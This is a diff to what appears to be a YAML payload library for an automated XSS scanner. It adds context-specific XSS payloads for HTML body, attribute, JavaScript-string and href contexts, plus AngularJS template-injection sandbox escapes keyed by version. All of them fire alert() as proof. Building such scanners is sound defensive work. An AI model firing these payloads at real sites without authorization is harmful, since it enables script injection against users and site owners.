@@ -57,3 +57,60 @@ payloads:
 
 # Confirmation marker injected into blind payloads — browser validator looks for this
 confirm_marker: "DAST_XSS_CONFIRM"
+
+# ── Deterministic xss_probe context library (read via get_value("xss", ...)) ──
+# The xss_probe tool self-detects the reflection CONTEXT (where the marker landed in the
+# rendered DOM) and picks the context-correct payload from here, delivering it through the
+# real agent browser and confirming strictly via a captured alert() dialog.
+#
+# {MARK} is a unique per-RUN numeric token the tool substitutes into every context_payloads
+# entry before delivery. CONFIRMED requires the captured dialog message to CONTAIN that exact
+# {MARK} value — a stray/ambient alert cannot satisfy it, so there are no false positives.
+# The *_quote_free sibling is selected when the app HTML-encodes quotes near the reflection
+# (so a payload that needs a raw " or ' would be neutralised); those vectors avoid quotes
+# entirely (String.fromCharCode / /XSS/.source).
+context_payloads:
+  html_body:
+    - '<img src=x onerror=alert({MARK})>'
+    - '<svg onload=alert({MARK})>'
+  attr_double_quote:
+    - '"><img src=x onerror=alert({MARK})>'
+    - '" autofocus onfocus=alert({MARK}) x="'
+  attr_single_quote:
+    - "'><img src=x onerror=alert({MARK})>"
+    - "' autofocus onfocus=alert({MARK}) x='"
+  js_string_double:
+    - '";alert({MARK})//'
+    - '</script><img src=x onerror=alert({MARK})>'
+  js_string_single:
+    - "';alert({MARK})//"
+  href_js:
+    - 'javascript:alert({MARK})'
+  html_body_quote_free:
+    - '<img src=x onerror=alert(String.fromCharCode(88))>'
+    - '<svg onload=alert(/XSS/.source)>'
+
+# AngularJS client-side template injection (CSTI) sandbox-escape vectors, keyed by the AngularJS
+# ERA detected on the page (1.2 / 1.3 / 1.4 / 1.5, and no_sandbox for 1.0-1.1 and 1.6+ where the
+# expression sandbox was absent or removed). These are FIXED published cheat-sheet forms that call
+# a literal alert(1) — the sandbox escape itself is structural and cannot be re-parameterised with
+# {MARK}, so the tool still confirms via a fired dialog whose message is "1". If a lab fails,
+# re-verify the vector against the current PortSwigger / AngularJS CSTI cheat sheet for that era.
+angular_csti:
+  no_sandbox:
+    - '{{constructor.constructor("alert(1)")()}}'
+  "1.2":
+    - '{{"a".constructor.prototype.charAt=[].join;$eval("x=alert(1)");}}'
+  "1.3":
+    - '{{"a".constructor.prototype.charAt=[].join;$eval("x=alert(1)");}}'
+  "1.4":
+    - '{{a=toString().constructor.prototype;a.charAt=a.trim;$eval("a,alert(1),a")}}'
+  "1.5":
+    - "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"
+
+# AngularJS CSTI variant for when quotes are HTML-encoded near the reflection: this $parse-key
+# shape escapes the sandbox WITHOUT any string literal in the injected payload (it builds the
+# string via fromCharCode on char codes for "x=alert(1)"). Keyed by era like angular_csti.
+angular_no_strings:
+  "1.4":
+    - 'toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1'
